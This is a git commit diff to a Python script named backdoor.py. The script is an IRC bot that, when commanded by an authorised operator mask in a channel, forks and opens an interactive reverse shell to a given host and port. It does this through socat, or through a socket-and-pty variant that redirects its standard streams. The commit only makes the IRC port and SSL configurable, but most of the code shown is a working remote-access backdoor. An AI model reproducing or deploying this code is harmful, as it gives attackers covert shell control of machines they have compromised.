263104cd1540379098faa878db818ea581d61063
rofl0r <retnyg@gmx.net>
2019-03-16 17:39:48 +0000

    make irc server port and whether to use ssl configurable

--- backdoor.py
+++ backdoor.py
@@ -11,17 +11,16 @@ socat file:`tty`,raw,echo=0 tcp-listen:$port
 from rocksock import Rocksock, RocksockException
 from irc import RsIRC
 
-from config import debug
+import config
 
 def print_exception(irc, channel, lines):
 	for line in lines.splitlines():
 		irc.privmsg(channel, line)
 
 def dprint(irc, channel, msg):
-	if debug: irc.privmsg(channel, "[DEBUG] " + msg)
+	if config.debug: irc.privmsg(channel, "[DEBUG] " + msg)
 
 def dumb_backdoor(irc, channel, server, port):
-	from config import shell
 	import pty, socket, os
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
@@ -32,7 +31,7 @@ def dumb_backdoor(irc, channel, server, port):
 		os.dup2(s.fileno(),1)
 		os.dup2(s.fileno(),2)
 		#os.putenv("HISTFILE",'/dev/null')
-		pty.spawn(shell)
+		pty.spawn(config.shell)
 	except Exception as e:
 		import traceback
 		print_exception(irc, channel, traceback.format_exc())
@@ -41,13 +40,12 @@ def backdoor(irc, channel, server, port):
 	import os
 	import shlex
 	import traceback
-	from config import shell
 
 	dprint(irc, channel, "running backdoor to %s:%d"%(server, port))
 
 	pid = os.fork()
 	if pid == 0: #child
-		cmd = "socat exec:'%s -i',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(shell, server, port)
+		cmd = "socat exec:'%s -i',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(config.shell, server, port)
 		cmdarr = shlex.split(cmd)
 		try:
 			os.execvp('socat', cmdarr)
@@ -67,9 +65,8 @@ def addresses_bot(word, nickname):
 
 if __name__ == '__main__':
 	import time
-	from config import host, botnick, channel, opmask, backdoorserver
 
-	irc = RsIRC(host=host, port=6697, timeout=180, ssl=True, nickname=botnick, username='blah')
+	irc = RsIRC(host=config.host, port=config.port, timeout=180, ssl=config.ssl, nickname=config.botnick, username='blah')
 	irc.reconnect()
 	while True:
 		s = irc.readline()
@@ -89,29 +86,29 @@ if __name__ == '__main__':
 			irc.nickname = irc.nickname + "_"
 			irc.reconnect()
 		elif b == '376': #MOTD finish
-			irc.sendl('JOIN %s'%channel)
+			irc.sendl('JOIN %s'%config.channel)
 		elif b == "PRIVMSG":
 			a,b,c,d = s.split(' ', 3)
 			a = a.lstrip(':')
 			try:
 				nick, mask = a.split('!')
 			except:
-				irc.privmsg(channel, "OOPS " + a)
+				irc.privmsg(config.channel, "OOPS " + a)
 				nick = ""
 				mask = ""
 			if mask.startswith('~'): mask = mask[1:]
-			if mask == opmask:
+			if mask == config.opmask:
 				d = d.lstrip(':')
 				words = d.split(' ')
 				if addresses_bot(words[0], irc.nickname):
 					try:
 						if len(words) == 3:
-							backdoor(irc, channel, words[1], int(words[2]))
+							backdoor(irc, config.channel, words[1], int(words[2]))
 						elif len(words) == 2:
-							backdoor(irc, channel, backdoorserver, int(words[1]))
+							backdoor(irc, config.channel, config.backdoorserver, int(words[1]))
 					except Exception as e:
 						import traceback
-						print_exception(irc, channel, traceback.format_exc())
+						print_exception(irc, config.channel, traceback.format_exc())
 
 		if not s: continue
 		print s
